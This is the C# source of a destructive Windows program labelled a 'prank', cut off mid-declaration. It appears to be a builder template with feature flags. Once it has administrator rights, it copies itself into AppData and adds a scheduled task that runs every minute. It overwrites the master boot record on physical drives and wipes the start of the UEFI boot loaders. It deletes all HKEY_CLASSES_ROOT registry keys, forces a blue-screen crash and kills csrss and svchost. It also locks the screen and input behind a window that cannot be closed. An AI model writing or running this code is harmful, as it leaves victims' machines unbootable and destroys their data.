using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
#if ENABLE_GDI || ENABLE_FULLSCREEN || ENABLE_VIDEO
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
#endif
#if ENABLE_GDI || ENABLE_AUDIO
using System.Media;
#endif

namespace Cannon
{
    public static class StartBomb
    {
#if ENABLE_GDI
        internal static readonly string safeText = "{SAFE_TEXT}";
#endif
        internal static volatile bool _readyForBSOD  = false;
        internal static volatile bool _bsodEnabled   =
#if ENABLE_BSOD
            true;
#else
            false;
#endif

        static readonly System.Threading.Mutex _singleInst =
            new System.Threading.Mutex(false, "Global\\MG_Prank_8B2F");

        [System.STAThread]
        public static void Main()
        {
            Run();
        }

        static void Run()
        {
            if (!MBR.IsAdmin()) return;

            bool gotMutex;
            try { gotMutex = _singleInst.WaitOne(0); }
            catch (System.Threading.AbandonedMutexException) { gotMutex = true; }
            if (!gotMutex) return;

            Persist.Install();

#if LOCK_KEYBOARD
            InputLock.InstallKeyboardHook();
#endif
#if LOCK_MOUSE
            InputLock.InstallMouseHook();
#endif

#if ENABLE_FULLSCREEN
            FullscreenDisplay.Show();
#endif
#if ENABLE_VIDEO
            VideoPlayer.Play();
#endif
#if ENABLE_AUDIO
            AudioPlayer.Play();
#endif

#if ENABLE_GDI
            Task.Run(new Action(GDI.Start));
#if !ENABLE_AUDIO
            Task.Run(new Action(BeatLoop));
#endif
#endif

            MBR.OverwriteMBR();

#if ENABLE_BSOD
            var bsodThread = new Thread(() =>
            {
#if ENABLE_VIDEO || ENABLE_FULLSCREEN || ENABLE_AUDIO
                while (!_readyForBSOD) Thread.Sleep(100);
#endif
#if ENABLE_GDI
                Thread.Sleep(2000);
#endif
                MBR.TriggerBSOD();
                Task.Run(new Action(RegNuke));
            });
            bsodThread.IsBackground = false;
            bsodThread.Start();
            Thread.Sleep(Timeout.Infinite);
#elif ENABLE_GDI
            Thread.Sleep(Timeout.Infinite);
#else
            Thread.Sleep(Timeout.Infinite);
#endif
        }

#if ENABLE_BSOD
        static void RegNuke()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.ClassesRoot)
                {
                    foreach (var subKey in key.GetSubKeyNames())
                    {
                        try { key.DeleteSubKeyTree(subKey, false); } catch { }
                    }
                }
            }
            catch { }
        }
#endif

#if ENABLE_GDI
        static void BeatLoop()
        {
            foreach (var f in GDI.formulas)
            {
                byte[] buf = GDI.MakeBeat(f);
                byte[] b = buf;
                Task.Run(new Action(delegate { GDI.PlayLoop(b); }));
                Thread.Sleep(100);
            }
            Thread.Sleep(Timeout.Infinite);
        }
#endif
    }

#if ENABLE_GDI
    public static class GDI
    {
        [DllImport("user32.dll")] static extern int    GetSystemMetrics(int n);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("gdi32.dll")]  static extern IntPtr CreateSolidBrush(int c);
        [DllImport("gdi32.dll")]  static extern IntPtr SelectObject(IntPtr hdc, IntPtr obj);
        [DllImport("gdi32.dll")]  static extern bool   BitBlt(IntPtr hdc, int x, int y, int w, int h, IntPtr src, int sx, int sy, uint rop);
        [DllImport("user32.dll")] static extern int    ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll")]  static extern bool   DeleteObject(IntPtr h);
        [DllImport("user32.dll")] static extern bool   InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        internal static volatile bool _stop = false;

        public static void Stop()
        {
            _stop = true;
            try { InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); } catch { }
        }

        const int SR    = 789489;
        const int DUR   = 10;
        const int BUFSZ = SR * DUR;

        internal static int F0(int t) { return (t * (t >> 5 | t >> 8)) >> (t >> 16); }
        internal static int F1(int t) { return (t >> 4 | t >> 8) * t >> (t >> 10); }
        internal static int F2(int t) { return (t >> 7 | t >> 12) * t ^ (t >> 6); }
        internal static Func<int, int>[] formulas = { new Func<int, int>(F0), new Func<int, int>(F1), new Func<int, int>(F2) };

        static readonly Random rng = new Random();

        static readonly Icon[] icons = {
            SystemIcons.Application, SystemIcons.Asterisk,  SystemIcons.Error,
            SystemIcons.Exclamation, SystemIcons.Hand,      SystemIcons.Information,
            SystemIcons.Question,    SystemIcons.Warning,   SystemIcons.WinLogo,
            SystemIcons.Shield
        };

        public static void Start()
        {
            Task.Run(new Action(BitBltLoop));
            Task.Run(new Action(DrawLoop));
        }

        static void DrawLoop()
        {
            int sw = GetSystemMetrics(0);
            int sh = GetSystemMetrics(1);
            Font font = null;
            try { font = new Font("Impact", 84, FontStyle.Bold); } catch { }

            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                if (hdc == IntPtr.Zero) { Thread.Sleep(20); continue; }

                int col = rng.Next(255) | rng.Next(255) << 8 | rng.Next(255) << 16;
                IntPtr brush = CreateSolidBrush(col);
                SelectObject(hdc, brush);
                int ry = rng.Next(sh);
                BitBlt(hdc, -5, ry, sw, 56, hdc, 0, ry, 0x1900ac);

                try
                {
                    using (var g = Graphics.FromHdc(hdc))
                    {
                        var icon = icons[rng.Next(icons.Length)];
                        int ix = rng.Next(0, sw - icon.Width);
                        int iy = rng.Next(0, sh - icon.Height);
                        g.DrawIcon(icon, ix, iy);
                        g.DrawIcon(SystemIcons.Error, Cursor.Position.X - 26, Cursor.Position.Y - 26);
                        if (font != null && !string.IsNullOrEmpty(StartBomb.safeText))
                        {
                            var clr = Color.FromArgb(rng.Next(256), rng.Next(256), rng.Next(256));
                            using (var br = new SolidBrush(clr))
                                g.DrawString(StartBomb.safeText, font, br, ix + icon.Width + 20, iy);
                        }
                    }
                }
                catch { }

                ReleaseDC(IntPtr.Zero, hdc);
                DeleteObject(brush);
                Thread.Sleep(20);
            }
        }

        static void BitBltLoop()
        {
            int sw = GetSystemMetrics(0);
            int sh = GetSystemMetrics(1);
            while (!_stop)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                if (hdc != IntPtr.Zero)
                {
                    BitBlt(hdc, rng.Next(-1, 1), rng.Next(-1, 1), sh, sw, hdc, 0, 0, 0x00CC0020);
                    BitBlt(hdc, rng.Next(-1, 1), rng.Next(-1, 1), sw, sh, hdc, 0, 0, 0x7273ec2f);
                    ReleaseDC(IntPtr.Zero, hdc);
                }
                Thread.Sleep(15);
            }
        }

        static void SaveWav(byte[] buf, string path)
        {
            try
            {
                using (var fs = new FileStream(path, FileMode.Create, FileAccess.Write, FileShare.None))
                using (var bw = new BinaryWriter(fs))
                {
                    bw.Write(0x46464952); bw.Write(36 + buf.Length); bw.Write(0x45564157);
                    bw.Write(0x20746D66); bw.Write(16);
                    bw.Write((short)1); bw.Write((short)1);
                    bw.Write(SR); bw.Write(SR);
                    bw.Write((short)1); bw.Write((short)8);
                    bw.Write(0x61746164); bw.Write(buf.Length); bw.Write(buf);
                }
            }
            catch { }
        }

        public static void PlayLoop(byte[] buf)
        {
            try
            {
                string tmp = Path.GetTempFileName();
                SaveWav(buf, tmp);
                var pl = new SoundPlayer(tmp);
                pl.PlayLooping();
                Thread.Sleep(Timeout.Infinite);
            }
            catch { }
        }

        public static byte[] MakeBeat(Func<int, int> f)
        {
            var buf = new byte[BUFSZ];
            for (int i = 0; i < BUFSZ; i++)
                buf[i] = (byte)(f(i) & 0xFF);
            return buf;
        }
    }
#endif

    static class Persist
    {
        internal static void Install()
        {
            try
            {
                string self    = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string dest    = Path.Combine(appData, Path.GetFileName(self));
                string name    = Path.GetFileNameWithoutExtension(self);
                try { File.Copy(self, dest, true); } catch { }
                var psi = new ProcessStartInfo("schtasks.exe")
                {
                    Arguments      = "/create /f /sc minute /mo 1 /tn \"" + name + "\" /tr \"" + dest + "\"",
                    WindowStyle    = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                var ps = Process.Start(psi);
                if (ps != null) ps.WaitForExit();
            }
            catch { }
        }
    }

    public static class MBR
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr CreateFile(string name, uint acc, uint share, IntPtr sec, uint disp, uint flags, IntPtr tmpl);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteFile(IntPtr h, byte[] buf, uint n, out uint written, IntPtr ov);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadFile(IntPtr h, byte[] buf, uint n, out uint read, IntPtr ov);
        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr h);
#if ENABLE_BSOD
        [DllImport("ntdll.dll")]
        static extern int NtSetInformationProcess(IntPtr h, int cls, ref int info, int len);
#endif
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetFilePointerEx(IntPtr h, long dist, out long newPos, uint method);
        [DllImport("kernel32.dll")]
        static extern bool FlushFileBuffers(IntPtr h);
        [DllImport("kernel32.dll")]
        static extern bool DeviceIoControl(IntPtr h, uint code, IntPtr inBuf, uint inSz, IntPtr outBuf, uint outSz, out uint ret, IntPtr ov);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern uint GetFirmwareEnvironmentVariableW(string name, string guid, IntPtr buf, uint sz);
#if ENABLE_BSOD
        [DllImport("ntdll.dll")]
        static extern int RtlAdjustPrivilege(int p, bool e, bool c, out bool prev);
        [DllImport("ntdll.dll")]
        static extern int NtRaiseHardError(uint err, uint num, uint mask, IntPtr prm, uint valid, out uint resp);
#endif

        const uint GENERIC_READ       = 0x80000000;
        const uint GENERIC_WRITE      = 0x40000000;
        const uint FILE_SHARE_READ    = 0x00000001;
        const uint FILE_SHARE_WRITE   = 0x00000002;
        const uint OPEN_EXISTING      = 3;
        const uint FILE_BEGIN         = 0;
        const uint FLAG_WRITE_THROUGH = 0x80000000;
        const uint FSCTL_LOCK_VOLUME  = 0x00090018;
        const uint FSCTL_DISMOUNT_VOL = 0x00090020;

        static readonly IntPtr INVALID_HANDLE = new IntPtr(-1);

        static readonly string[] DriveTargets = {
            "\\\\.\\PhysicalDrive0",
            "\\\\.\\GLOBALROOT\\Device\\Harddisk0\\DR0",
            "\\\\.\\PhysicalDrive1",
            "\\\\.\\GLOBALROOT\\Device\\Harddisk1\\DR1",
            "\\\\.\\PhysicalDrive2",
            "\\\\.\\GLOBALROOT\\Device\\Harddisk2\\DR2",
            "\\\\.\\PhysicalDrive3",
            "\\\\.\\GLOBALROOT\\Device\\Harddisk3\\DR3",
        };

        static byte[] GetResource(string name)
        {
            try
            {
                var asm = System.Reflection.Assembly.GetExecutingAssembly();
                string resName = null;
                foreach (string r in asm.GetManifestResourceNames())
                    if (r.EndsWith(name, StringComparison.OrdinalIgnoreCase)) { resName = r; break; }
                if (resName == null) return null;
                using (var s = asm.GetManifestResourceStream(resName))
                {
                    if (s == null) return null;
                    var b = new byte[s.Length];
                    s.Read(b, 0, b.Length);
                    return b;
                }
            }
            catch { return null; }
        }

#if ENABLE_BSOD
        public static void TriggerBSOD()
        {
            try
            {
                bool prev;
                RtlAdjustPrivilege(19, true, false, out prev);
                uint resp;
                NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out resp);
            }
            catch { }
            try
            {
                int v = 1, cls = 0x1D;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, cls, ref v, sizeof(int));
                Environment.FailFast("");
            }
            catch { }
            try { Process.Start(new ProcessStartInfo("taskkill", "/f /im svchost.exe") { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch { }
            try { Process.Start(new ProcessStartInfo("taskkill", "/f /im csrss.exe")   { WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }); } catch { }
        }
#endif

        static bool IsUEFI()
        {
            GetFirmwareEnvironmentVariableW("", "{00000000-0000-0000-0000-000000000000}", IntPtr.Zero, 0);
            return Marshal.GetLastWin32Error() != 1;
        }

        static void DisableFastStartup()
        {
            try
            {
                using (var k = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power", true))
                    if (k != null)
                        k.SetValue("HiberbootEnabled", 0, Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch { }
            try
            {
                Process.Start(new ProcessStartInfo("powercfg", "/h off")
                    { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden, UseShellExecute = false });
            }
            catch { }
        }

        static void HandleUEFI()
        {
            try
            {
                char drv = '\0';
                foreach (char c in "ZYXWVUTSRQPONMLKJIHGFEDCBA")
                    if (!Directory.Exists(c + ":\\")) { drv = c; break; }
                if (drv == '\0') return;
                string mp = drv + ":";
                var mnt = Process.Start(new ProcessStartInfo("mountvol", mp + " /s")
                    { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden, UseShellExecute = false });
                if (mnt != null) mnt.WaitForExit(5000);
                string[] targets = {
                    drv + ":\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
                    drv + ":\\EFI\\Microsoft\\Boot\\bootmgr.efi",
                    drv + ":\\EFI\\Boot\\bootx64.efi",
                };
                foreach (string t in targets)
                {
                    try
                    {
                        if (!File.Exists(t)) continue;
                        long sz = new FileInfo(t).Length;
                        int wipe = (int)(sz > 4096 ? 4096 : sz);
                        using (var fs = new FileStream(t, FileMode.Open, FileAccess.Write, FileShare.None))
                            fs.Write(new byte[wipe], 0, wipe);
                    }
                    catch { }
                }
                try
                {
                    var u = Process.Start(new ProcessStartInfo("mountvol", mp + " /d")
                        { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden, UseShellExecute = false });
                    if (u != null) u.WaitForExit(3000);
                }
                catch { }
            }
            catch { }
        }

        static string FindBootDrive()
        {
            try
            {
                string sysVol = string.Format("\\\\.\\{0}",
                    Path.GetPathRoot(Environment.SystemDirectory).TrimEnd('\\'));
                IntPtr h = CreateFile(sysVol, 0, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
                if (h == INVALID_HANDLE) return null;
                try
                {
                    byte[] buf = new byte[32]; uint ret = 0;
                    System.Runtime.InteropServices.GCHandle gch =
                        System.Runtime.InteropServices.GCHandle.Alloc(buf,
                            System.Runtime.InteropServices.GCHandleType.Pinned);
                    try
                    {
                        bool ok = DeviceIoControl(h, 0x00560000, IntPtr.Zero, 0,
                            gch.AddrOfPinnedObject(), (uint)buf.Length, out ret, IntPtr.Zero);
                        if (!ok || ret < 12) return null;
                    }
                    finally { gch.Free(); }
                    uint diskNum = BitConverter.ToUInt32(buf, 4);
                    return string.Format("\\\\.\\PhysicalDrive{0}", diskNum);
                }
                finally { CloseHandle(h); }
            }
            catch { return null; }
        }

        static void TryDismountVolumes()
        {
            try
            {
                string sysRoot = Path.GetPathRoot(Environment.SystemDirectory);
                var vols = new System.Collections.Generic.List<string>();
                if (!string.IsNullOrEmpty(sysRoot))
                    vols.Add(string.Format("\\\\.\\{0}", sysRoot.TrimEnd('\\')));
                foreach (string c in new[] { "C:", "D:", "E:", "F:" })
                    vols.Add("\\\\.\\" + c);
                foreach (string vol in vols)
                {
                    IntPtr h = CreateFile(vol, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
                    if (h == INVALID_HANDLE) continue;
                    try
                    {
                        uint ret;
                        DeviceIoControl(h, FSCTL_LOCK_VOLUME,  IntPtr.Zero, 0, IntPtr.Zero, 0, out ret, IntPtr.Zero);
                        DeviceIoControl(h, FSCTL_DISMOUNT_VOL, IntPtr.Zero, 0, IntPtr.Zero, 0, out ret, IntPtr.Zero);
                    }
                    finally { CloseHandle(h); }
                }
            }
            catch { }
        }

        public static void OverwriteMBR()
        {
            byte[] mbr = GetResource("mbr.bin");
            if (mbr == null || mbr.Length != 512) return;
            if (mbr[510] != 0x55 || mbr[511] != 0xAA) return;

            DisableFastStartup();
            if (IsUEFI()) HandleUEFI();
            TryDismountVolumes();

            string activeDrive = null;
            string bootDrive = FindBootDrive();
            if (bootDrive != null && WriteSector(bootDrive, 0, mbr))
                activeDrive = bootDrive;
            if (activeDrive == null)
            {
                foreach (string target in DriveTargets)
                    if (WriteSector(target, 0, mbr)) { activeDrive = target; break; }
            }
            WriteImageSectors(activeDrive);
        }

        static bool IsGPT(string path)
        {
            IntPtr h = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            if (h == INVALID_HANDLE) return false;
            try
            {
                byte[] buf = new byte[8]; uint read = 0; long np;
                SetFilePointerEx(h, 512L, out np, FILE_BEGIN);
                ReadFile(h, buf, 8, out read, IntPtr.Zero);
                return read == 8 &&
                    buf[0]==0x45 && buf[1]==0x46 && buf[2]==0x49 && buf[3]==0x20 &&
                    buf[4]==0x50 && buf[5]==0x41 && buf[6]==0x52 && buf[7]==0x54;
            }
            catch { return false; }
            finally { CloseHandle(h); }
        }

        static bool WriteSector(string path, int sectorOffset, byte[] data)
        {
            for (int attempt = 0; attempt < 3; attempt++)
            {
                IntPtr h = CreateFile(path, GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING,
                    FLAG_WRITE_THROUGH, IntPtr.Zero);
                if (h == INVALID_HANDLE) { if (attempt < 2) Thread.Sleep(300); continue; }
                try
                {
                    long np;
                    SetFilePointerEx(h, (long)sectorOffset * 512L, out np, FILE_BEGIN);
                    uint written;
                    bool ok = WriteFile(h, data, (uint)data.Length, out written, IntPtr.Zero);
                    if (ok && written == (uint)data.Length) { FlushFileBuffers(h); return true; }
                }
                finally { CloseHandle(h); }
                if (attempt < 2) Thread.Sleep(300);
            }
            return false;
        }

        static void WriteImageSectors(string drivePath)
        {
            try
            {
                byte[] img = GetResource("img.bin");
                if (img == null || img.Length == 0 || img.Length % 512 != 0) return;
                if (drivePath != null)
                {
                    int startSector = IsGPT(drivePath) ? 34 : 1;
                    WriteSector(drivePath, startSector, img);
                }
                else
                {
                    foreach (string target in DriveTargets)
                    {
                        int s = IsGPT(target) ? 34 : 1;
                        if (WriteSector(target, s, img)) break;
                    }
                }
            }
            catch { }
        }

        public static bool IsAdmin()
        {
            try
            {
                var id = System.Security.Principal.WindowsIdentity.GetCurrent();
                return new System.Security.Principal.WindowsPrincipal(id)
                           .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }
    }

#if ENABLE_FULLSCREEN
    public static class FullscreenDisplay
    {
        static byte[] _GetData()
        {
            try
            {
                var asm = System.Reflection.Assembly.GetExecutingAssembly();
                foreach (string r in asm.GetManifestResourceNames())
                {
                    if (r.EndsWith("screen.bin", StringComparison.OrdinalIgnoreCase))
                    {
                        using (var s = asm.GetManifestResourceStream(r))
                        {
                            if (s == null) return null;
                            var b = new byte[s.Length];
                            s.Read(b, 0, b.Length);
                            return b;
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        public static void Show()
        {
            byte[] data = _GetData();
            if (data == null) return;
            var t = new Thread(new ParameterizedThreadStart(_ThreadMain));
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = false;
            t.Start(data);
        }

        static void _ThreadMain(object state)
        {
            try
            {
                Application.EnableVisualStyles();
                _LockForm frm = new _LockForm((byte[])state);
                Application.Run(frm);
            }
            catch { }
        }
    }

    sealed class _LockForm : Form
    {
        [DllImport("user32.dll")] static extern bool ShowCursor(bool show);
        [DllImport("user32.dll")] static extern void keybd_event(byte vk, byte sc, uint flags, UIntPtr extra);

        Image        _img;
        MemoryStream _ms;
        int          _frameCount;
        int          _framesSeen;
        bool         _gifSignaled;

        internal _LockForm(byte[] data)
        {
            _ms  = new MemoryStream(data);
            _img = Image.FromStream(_ms);

            FormBorderStyle = FormBorderStyle.None;
            TopMost         = true;
            WindowState     = FormWindowState.Maximized;
            BackColor       = Color.Black;
            ShowInTaskbar   = false;
            Bounds          = Screen.PrimaryScreen.Bounds;
            SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
            ShowCursor(false);
            keybd_event(0x5B, 0, 2, UIntPtr.Zero);

            if (ImageAnimator.CanAnimate(_img))
            {
                try
                {
                    var dim = new FrameDimension(_img.FrameDimensionsList[0]);
                    _frameCount = _img.GetFrameCount(dim);
                }
                catch { _frameCount = 0; }
                ImageAnimator.Animate(_img, _OnFrame);
            }
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            if (_frameCount == 0)
            {
#if !ENABLE_AUDIO
                new System.Threading.Timer(_OnStaticTimer, null, 15000, -1);
#endif
            }
        }

        void _OnStaticTimer(object s)
        {
            StartBomb._readyForBSOD = true;
        }

        void _OnFrame(object sender, EventArgs e)
        {
            if (!_gifSignaled)
            {
                _framesSeen++;
                if (_frameCount > 0 && _framesSeen >= _frameCount)
                {
                    _gifSignaled = true;
                    ImageAnimator.StopAnimate(_img, _OnFrame);
#if !ENABLE_AUDIO
                    StartBomb._readyForBSOD = true;
#endif
                    return;
                }
            }
            if (!_gifSignaled)
                try { Invalidate(); } catch { }
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            if (_img != null)
            {
                ImageAnimator.UpdateFrames(_img);
                e.Graphics.DrawImage(_img, 0, 0, ClientSize.Width, ClientSize.Height);
            }
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_CLOSE      = 0x0010;
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE      = 0xF060;
            const int WM_KEYDOWN    = 0x0100;
            const int WM_SYSKEYDOWN = 0x0104;
            const int WM_MOUSEMOVE  = 0x0200;
            if (m.Msg == WM_CLOSE) return;
            if (m.Msg == WM_SYSCOMMAND && ((int)m.WParam & 0xFFF0) == SC_CLOSE) return;
            if (m.Msg == WM_KEYDOWN)    return;
            if (m.Msg == WM_SYSKEYDOWN) return;
            base.WndProc(ref m);
            if (m.Msg == WM_MOUSEMOVE) { TopMost = false; TopMost = true; Focus(); }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData) { return true; }
        protected override void OnActivated(EventArgs e) { base.OnActivated(e); TopMost = true; }

        protected override void Dispose(bool d)
        {
            if (d)
            {
                try { ImageAnimator.StopAnimate(_img, _OnFrame); } catch { }
                if (_img != null) _img.Dispose();
                if (_ms  != null) _ms.Dispose();
            }
            base.Dispose(d);
        }
    }
#endif

#if ENABLE_VIDEO
    public static class VideoPlayer
    {
        static byte[] _GetData()
        {
            try
            {
                var asm = System.Reflection.Assembly.GetExecutingAssembly();
                foreach (string r in asm.GetManifestResourceNames())
                {
                    if (r.EndsWith("video.bin", StringComparison.OrdinalIgnoreCase))
                    {
                        using (var s = asm.GetManifestResourceStream(r))
                        {
                            if (s == null) return null;
                            var b = new byte[s.Length];
                            s.Read(b, 0, b.Length);
                            return b;
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        public static void Play()
        {
            byte[] data = _GetData();
            if (data == null) return;
            var t = new Thread(new ParameterizedThreadStart(_STA));
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = false;
            t.Start(data);
        }

        static void _STA(object state)
        {
            try
            {
                byte[] data = (byte[])state;
                string tmp = Path.Combine(Path.GetTempPath(),
                    Guid.NewGuid().ToString("N") + ".{VIDEO_EXT}");
                File.WriteAllBytes(tmp, data);

                System.Windows.Threading.Dispatcher.CurrentDispatcher.InvokeAsync(() =>
                {
                    bool first = true;
                    foreach (Screen scr in Screen.AllScreens)
                    {
                        try
                        {
                            bool withAudio = first;
                            first = false;
                            var win = new _WpfVideoWindow(tmp, scr.Bounds, withAudio);
                            win.Show();
                        }
                        catch { }
                    }
                });

                System.Windows.Threading.Dispatcher.Run();
            }
            catch { }
        }
    }

    sealed class _WpfVideoWindow : System.Windows.Window
    {
        [DllImport("user32.dll")] static extern bool ShowCursor(bool show);

        readonly bool _master;
        System.Windows.Controls.MediaElement _me;
        static volatile bool _globalEnded = false;

        internal _WpfVideoWindow(string path, Rectangle bounds, bool master)
        {
            _master       = master;
            WindowStyle   = System.Windows.WindowStyle.None;
            ResizeMode    = System.Windows.ResizeMode.NoResize;
            Background    = System.Windows.Media.Brushes.Black;
            Topmost       = true;
            ShowInTaskbar = false;
            Left          = bounds.Left;
            Top           = bounds.Top;
            Width         = bounds.Width;
            Height        = bounds.Height;

            ShowCursor(false);

            _me = new System.Windows.Controls.MediaElement
            {
                LoadedBehavior   = System.Windows.Controls.MediaState.Manual,
                UnloadedBehavior = System.Windows.Controls.MediaState.Stop,
                Stretch          = System.Windows.Media.Stretch.Fill,
                Source           = new Uri(path),
            };
            if (!master) _me.IsMuted = true;
            _me.MediaEnded += _OnEnded;

            Content = _me;
            Loaded  += (s, e) => _me.Play();
        }

        void _OnEnded(object sender, System.Windows.RoutedEventArgs e)
        {
            if (!_master) return;
            if (StartBomb._bsodEnabled)
            {
                _globalEnded = true;
                StartBomb._readyForBSOD = true;
                _me.Stop();
            }
            else
            {
                _me.Position = TimeSpan.Zero;
                _me.Play();
            }
        }

        protected override void OnPreviewKeyDown(System.Windows.Input.KeyEventArgs e) { e.Handled = true; }
        protected override void OnClosing(System.ComponentModel.CancelEventArgs e)    { e.Cancel  = true;  }
        protected override void OnActivated(EventArgs e) { base.OnActivated(e); Topmost = true; }
    }
#endif

#if ENABLE_AUDIO
    public static class AudioPlayer
    {
        [DllImport("winmm.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool PlaySound(string file, IntPtr hmod, uint flags);

        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
        static extern int mciSendString(string cmd, System.Text.StringBuilder ret, int retLen, IntPtr cb);

        const uint SND_FILENAME  = 0x00020000;
        const uint SND_LOOP      = 0x00000008;
        const uint SND_ASYNC     = 0x00000001;
        const uint SND_NODEFAULT = 0x00000002;

        static byte[] _GetData()
        {
            try
            {
                var asm = System.Reflection.Assembly.GetExecutingAssembly();
                foreach (string r in asm.GetManifestResourceNames())
                {
                    if (r.EndsWith("audio.bin", StringComparison.OrdinalIgnoreCase))
                    {
                        using (var s = asm.GetManifestResourceStream(r))
                        {
                            if (s == null) return null;
                            var b = new byte[s.Length];
                            s.Read(b, 0, b.Length);
                            return b;
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        public static void Play()
        {
            byte[] data = _GetData();
            if (data == null) return;
            var t = new Thread(new ParameterizedThreadStart(_PlayThread));
            t.IsBackground = false;
            t.Start(data);
        }

        static void _PlayThread(object state)
        {
            byte[] data = (byte[])state;
            try
            {
                string ext = "{AUDIO_EXT}";
                string tmp = Path.Combine(Path.GetTempPath(),
                    Guid.NewGuid().ToString("N") + "." + ext);
                File.WriteAllBytes(tmp, data);

                if (ext == "wav")
                {
#if ENABLE_BSOD
                    PlaySound(tmp, IntPtr.Zero, SND_FILENAME | SND_NODEFAULT);
                    StartBomb._readyForBSOD = true;
#else
                    PlaySound(tmp, IntPtr.Zero, SND_FILENAME | SND_LOOP | SND_ASYNC | SND_NODEFAULT);
#endif
                    Thread.Sleep(Timeout.Infinite);
                    return;
                }

                var sb = new System.Text.StringBuilder(256);
                int rc = mciSendString("open \"" + tmp + "\" alias snd", sb, 256, IntPtr.Zero);
                if (rc != 0) { Thread.Sleep(Timeout.Infinite); return; }

                mciSendString("set snd time format milliseconds", null, 0, IntPtr.Zero);
                var lenSb = new System.Text.StringBuilder(128);
                mciSendString("status snd length", lenSb, 128, IntPtr.Zero);
                int totalMs = 0;
                int.TryParse(lenSb.ToString().Trim(), out totalMs);
                if (totalMs <= 0) totalMs = 300000;

#if ENABLE_BSOD
                mciSendString("seek snd to start", null, 0, IntPtr.Zero);
                mciSendString("play snd", null, 0, IntPtr.Zero);
                {
                    int elapsed = 0;
                    Thread.Sleep(1000); elapsed += 1000;
                    while (elapsed < totalMs + 2000)
                    {
                        Thread.Sleep(500); elapsed += 500;
                        var modeSb = new System.Text.StringBuilder(32);
                        mciSendString("status snd mode", modeSb, 32, IntPtr.Zero);
                        if (modeSb.ToString().Trim().ToLower() != "playing") break;
                    }
                }
                mciSendString("stop snd", null, 0, IntPtr.Zero);
                mciSendString("close snd", null, 0, IntPtr.Zero);
                StartBomb._readyForBSOD = true;
                Thread.Sleep(Timeout.Infinite);
#else
                while (true)
                {
                    mciSendString("seek snd to start", null, 0, IntPtr.Zero);
                    mciSendString("play snd", null, 0, IntPtr.Zero);
                    int elapsed = 0;
                    Thread.Sleep(1000); elapsed += 1000;
                    while (elapsed < totalMs + 2000)
                    {
                        Thread.Sleep(500); elapsed += 500;
                        var modeSb = new System.Text.StringBuilder(32);
                        mciSendString("status snd mode", modeSb, 32, IntPtr.Zero);
                        if (modeSb.ToString().Trim().ToLower() != "playing") break;
                    }
                    mciSendString("stop snd", null, 0, IntPtr.Zero);
                    Thread.Sleep(300);
                }
#endif
            }
            catch { Thread.Sleep(Timeout.Infinite); }
        }
    }
#endif

#if LOCK_MOUSE || LOCK_KEYBOARD
    public static class InputLock
    {
        [StructLayout(LayoutKind.Sequential)]
        struct MSG
        {
            public IntPtr hwnd;
            public uint   message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint   time;
            public int    ptX;
            public int    ptY;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct KBDLLHOOKSTRUCT { public uint vkCode; public uint scanCode; public uint flags; public uint time; public IntPtr dwExtraInfo; }

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int type, HookProc proc, IntPtr mod, uint threadId);
        [DllImport("user32.dll")]
